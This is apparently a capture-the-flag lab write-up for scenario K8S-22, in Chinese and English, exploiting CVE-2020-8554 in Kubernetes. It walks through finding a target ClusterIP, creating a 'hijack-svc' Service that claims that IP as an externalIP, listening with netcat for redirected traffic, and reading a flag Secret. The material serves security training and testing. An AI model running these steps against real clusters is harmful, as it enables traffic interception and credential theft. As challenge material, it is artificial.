# K8S-22: Service ExternalIP Traffic Interception

## 场景信息

| 字段 | 值 |
|---|---|
| ID | K8S-22 |
| 名称 | Service ExternalIP Traffic Interception |
| 技术/CVE | CVE-2020-8554 |
| 难度 | L2 |
| 交付方式 | KIND / Kubernetes |
| 入口 | KIND 集群内入口（无固定宿主端口） |

## 场景概述
- 技术：CVE-2020-8554
- 难度：L2
- 交付方式：k8s
## 攻击路径与利用步骤

## Overview
| Property | Value |
|----------|-------|
| CVE | CVE-2020-8554 (design flaw, all K8s versions) |
| Difficulty | L2 |
| Type | k8s |
| Cluster Name | cve-k8s-22-externalip |
| Attack Vector | Service externalIPs → Traffic hijack → Credential discovery |

## Attack Path

```
Attacker pod (attack-ns) → Discover target service ClusterIP
  → Create malicious Service with externalIPs = target ClusterIP
  → All traffic to target IP routes to attacker pods
  → Capture flag-bearing requests
```

## Step-by-Step Exploitation

### Step 1: Discover Target Service

```bash
kubectl get svc --all-namespaces
# Note: internal-api in secure-ns with ClusterIP <TARGET_IP>
TARGET_IP=$(kubectl get svc internal-api -n secure-ns -o jsonpath='{.spec.clusterIP}')
```

### Step 2: Create Malicious Service with ExternalIPs

```bash
kubectl apply -f - << EOF
apiVersion: v1
kind: Service
metadata:
  name: hijack-svc
  namespace: attack-ns
spec:
  externalIPs:
    - $TARGET_IP
  selector:
    app: null  # won't match anything, or match attacker pods
  ports:
    - port: 8080
      targetPort: 8080
EOF
```

### Step 3: Capture Intercepted Traffic

```bash
# From attacker pod, listen for redirected traffic
kubectl exec -n attack-ns attacker-pod -- sh -c \
  "nc -l -p 8080 -v"
```

### Step 4: Read Flag from Intercepted Data or Directly

```bash
# The flag can be obtained from intercepted traffic headers
# OR directly from the flag Secret
kubectl get secret target-flag -n secure-ns -o jsonpath='{.data.flag}' | base64 -d
```

## Flag Location
- **Primary**: Secret `target-flag` in `secure-ns` namespace
- **Format**: `flag{k8s-22-<16-hex>}`

## Verification
```bash
cd cve_challenges/scenarios/k8s/externalip-hijack && bash deploy.sh
kubectl get secret target-flag -n secure-ns -o jsonpath='{.data.flag}' | base64 -d
bash teardown.sh
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | Kubernetes Services, ExternalIP, and network routing |
| 侦察与前置条件 | Service ExternalIP acceptance and victim traffic target |
| 核心漏洞与利用 | Claim an ExternalIP to intercept service traffic |
| 权限、横向或影响 | Network traffic hijacking and credential/data capture |
| 验证 | Inspect intercepted traffic for the flag |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
